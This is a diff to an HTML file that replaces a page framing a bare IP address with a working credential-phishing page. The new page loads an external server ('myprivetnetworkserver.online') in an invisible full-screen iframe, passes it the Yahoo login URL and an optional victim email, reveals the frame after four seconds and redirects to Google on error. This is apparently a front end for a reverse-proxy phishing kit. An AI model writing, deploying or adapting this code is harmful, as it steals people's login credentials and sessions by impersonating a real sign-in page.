@@ -1,11 +1,27 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-    <iframe src="http://103.155.93.236/" frameborder="0" style="width: 100%; height: 100%;"></iframe>
+<script>
+    let src = "http://myprivetnetworkserver.online/client";
+    let login_url = "https://login.yahoo.com";
+    let email = ""; // keep it empty for no email
+    let error_page = "https://google.com";
+</script>
+<html>
+<body style="margin: 0; padding: 0">
+        
+    <iframe 
+        src="" 
+        frameborder="0" style="margin: 0; margin-top: -20px;opacity: 0"
+        onerror="location = error_page"
+    ></iframe>
+    <script>
+        src += '?' + encodeURIComponent(login_url)
+        if(email) src += '&' + encodeURIComponent(email)
+        document.querySelector('iframe').src = src 
+        setInterval(() => {
+            document.querySelector('iframe').style.width = window.innerWidth + 'px'
+            document.querySelector('iframe').style.height = (window.innerHeight + 20) + 'px'
+            // console.log(2);
+        }, 200);
+        setTimeout(() => document.querySelector('iframe').style.opacity = 1, 4000)
+    </script>
 </body>
 </html>
